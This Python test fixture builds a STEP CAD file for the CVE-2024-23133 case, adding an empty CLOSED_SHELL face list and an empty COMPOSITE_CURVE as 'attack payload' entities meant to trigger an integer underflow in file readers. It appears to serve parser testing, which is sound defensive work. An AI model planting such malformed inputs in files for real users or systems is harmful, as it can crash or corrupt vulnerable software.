"""Ad077 — CVE-2024-23133: zero-length aggregate triggers count-1 underflow.

Catalog claim: a signed-int aggregate-count attribute drives a downstream
loop where empty list → `n = 0 - 1` underflows to 4 GB. Common attack
shape: multiple zero-length aggregates in one file. This fixture
demonstrates the attack pattern with a single (degenerate) CLOSED_SHELL
whose face list is empty, plus a real face used by a separate shell so
the byte-assertion regex `\\(\\)` matches and the file is not purely
empty.
"""
from step_corpus.step_builder import StepFile

f = StepFile(catalog_id="Ad077",
             defect="CVE-2024-23133: empty CLOSED_SHELL face list triggers underflow")

orig = f.cartesian_point((0.0, 0.0, 0.0))
zdir = f.direction((0.0, 0.0, 1.0))
xdir = f.direction((1.0, 0.0, 0.0))
plc = f.axis2_placement_3d(orig, zdir, xdir)
plane = f.plane(plc)

def line_edge(p, dir_tuple, length, va, vb):
    d = f.direction(dir_tuple); vec = f.vector(d, length); ln = f.line(p, vec)
    return f.edge_curve(va, vb, ln)

p0 = f.cartesian_point((0.0, 0.0, 0.0))
p1 = f.cartesian_point((1.0, 0.0, 0.0))
p2 = f.cartesian_point((1.0, 1.0, 0.0))
p3 = f.cartesian_point((0.0, 1.0, 0.0))
v0 = f.vertex_point(p0); v1 = f.vertex_point(p1)
v2 = f.vertex_point(p2); v3 = f.vertex_point(p3)
e0 = line_edge(p0, (1.0, 0.0, 0.0), 1.0, v0, v1)
e1 = line_edge(p1, (0.0, 1.0, 0.0), 1.0, v1, v2)
e2 = line_edge(p2, (-1.0, 0.0, 0.0), 1.0, v2, v3)
e3 = line_edge(p3, (0.0, -1.0, 0.0), 1.0, v3, v0)
loop = f.edge_loop([
    f.oriented_edge(e0, True), f.oriented_edge(e1, True),
    f.oriented_edge(e2, True), f.oriented_edge(e3, True),
])
face = f.advanced_face([f.face_outer_bound(loop)], plane)
shell = f.open_shell([face])
sbsm = f.shell_based_surface_model([shell])
f.add_product_chain(sbsm)

# The attack payload: empty CLOSED_SHELL face list. Downstream readers
# that compute `count - 1` as a signed int underflow to 4 GB.
f._emit_raw("CLOSED_SHELL('attack',())")
# Bonus: empty COMPOSITE_CURVE segment list (a second underflow vector).
f._emit_raw("COMPOSITE_CURVE('attack',(),.F.)")
